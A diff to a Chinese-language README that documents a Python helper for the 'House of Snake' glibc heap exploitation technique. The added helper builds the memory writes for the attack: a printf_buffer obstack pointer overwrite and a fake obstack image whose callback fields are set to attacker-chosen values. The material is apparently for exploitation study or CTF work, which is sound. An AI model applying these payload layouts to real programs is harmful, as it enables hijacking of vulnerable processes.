@@ -41,7 +41,12 @@ C 语言 PoC 用的是官方合法 API 来设置回调，所以 API 本身不是
 
 ## Python 离线板子
 
-[`snake.py`](./snake.py) 提供 `build_house_of_snake`，生成 2.37+ printf_buffer obstack 消费路径的字段计划。
+[`snake.py`](./snake.py) 提供两个函数：
+
+```text
+build_house_of_snake         -> 返回 SnakePlan
+build_house_of_snake_payload -> 返回 printf buffer 指针写 + fake obstack 镜像
+```
 
 ### 函数用途
 
@@ -50,7 +55,7 @@ C 语言 PoC 用的是官方合法 API 来设置回调，所以 API 本身不是
 ### 最小使用示例
 
 ```python
-from snake import build_house_of_snake
+from snake import build_house_of_snake, build_house_of_snake_payload
 
 plan = build_house_of_snake(
     printf_buffer_addr=0x100000,  # printf buffer 对象
@@ -64,6 +69,18 @@ plan = build_house_of_snake(
 # 返回 SnakePlan 数据类
 print(plan.printf_buffer_addr, plan.obstack_addr,
       hex(plan.chunkfun), hex(plan.extra_arg))
+
+writes = build_house_of_snake_payload(
+    printf_buffer_addr=0x100000,
+    obstack_pointer_addr=0x100088,  # Build ID 确认后的 obstack 指针槽
+    obstack_addr=0x200000,
+    object_base=0x300000,
+    next_free=0x301000,
+    chunkfun_addr=0x401234,
+    extra_arg=0x500000,
+)
+for w in writes:
+    print(w.label, hex(w.address), w.data.hex())
 ```
 
 ### 对应 PoC
@@ -93,6 +110,19 @@ print(plan.printf_buffer_addr, plan.obstack_addr,
 | `chunk_limit` | 当前 chunk 上限。 |
 | `chunkfun` | 分配回调地址。 |
 | `extra_arg` | callback 第一个参数。 |
+
+### 返回对象 `MemoryWrite`
+
+`build_house_of_snake_payload` 返回两项写入：
+
+```text
+1. obstack_pointer_addr -> obstack_addr
+   label = "printf_buffer.obstack pointer"
+
+2. obstack_addr -> 0x70 字节 fake obstack 镜像
+   label = "fake obstack object"
+   关键字段同 house_of_obstack：+0x38 chunkfun、+0x40 extra_arg、+0x50 use_extra_arg、+0x58/+0x60/+0x68 边界。
+```
 
 ### 调用者必须提供
 
